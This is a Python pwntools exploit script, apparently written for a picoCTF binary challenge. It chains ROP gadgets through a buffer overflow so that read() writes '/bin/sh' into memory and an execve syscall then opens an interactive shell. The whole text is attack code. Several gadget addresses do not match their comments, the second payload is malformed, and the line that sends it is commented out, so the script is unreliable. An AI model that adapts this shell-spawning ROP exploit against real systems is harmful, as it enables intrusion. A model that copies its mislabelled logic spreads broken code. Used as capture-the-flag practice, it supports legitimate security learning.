from pwn import *
"""
ropper gadgets:

0x00000000004163f4: pop rax; ret;
0x0000000000400696: pop rdi; ret;
0x0000000000410ca3: pop rsi; ret;
0x000000000044cc26: pop rdx; ret;

0x000000000040137c: syscall;
0x0000000000449e35: syscall; ret;

"""

file = './vuln'
server = 'jupiter.challenges.picoctf.org'
port = 39940
elf = ELF(file)

payload = cyclic(cyclic_find(0x6261616762616166))
#payload += p64(0x0000000000400c44) # win func
payload += p64(0x410ca3) #pop rdi; ret
payload += p64(0) #null byte
payload += p64(0x410ca3) #pop rsi; ret
payload += p64(0x6bc4a0) #put bss (idk what this is) into rsi
payload += p64(0x44cc26) #pop rdx; ret
payload += p64(9)
payload += p64(elf.symbols['read'])
payload += p64(0x400c8c) #main func


p = process(file)
p.sendlineafter("guess?", b'84')


payload2 = cyclic(cyclic_find(0x6261616762616166))
payload2 += p64(0x4163f4) #pop rax; ret
payload2 += p64(0x3b)
payload2 += p64(0x410ca3) #pop rdi; ret
payload2 += p64(0x6bc4a0) #put bss (idk what this is) into rsi
payload2 += p64(0x410ca3) #pop rsi; ret
payload2 += p64(0)
payload2 += p64(0x44cc26) #pop rdx; ret
payload2 += p64(0x449e35)

p.sendlineafter("Name?", payload)
p.sendline(b'/bin/sh\x00')

p.sendlineafter("guess?", b'87')
#p.sendlineafter("Name?", payload2)

p.interactive()
